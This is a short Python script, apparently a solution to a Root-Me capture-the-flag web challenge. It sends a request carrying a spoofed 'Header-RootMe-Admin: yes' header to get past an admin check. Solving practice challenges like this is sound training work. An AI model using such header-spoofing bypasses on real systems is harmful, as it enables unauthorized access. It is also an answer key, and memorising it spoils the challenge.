import requests

url = 'http://challenge01.root-me.org/web-serveur/ch5/'

headers = {
	'Header-RootMe-Admin': 'yes'
}

r = requests.get(url, headers=headers)

print(r.text)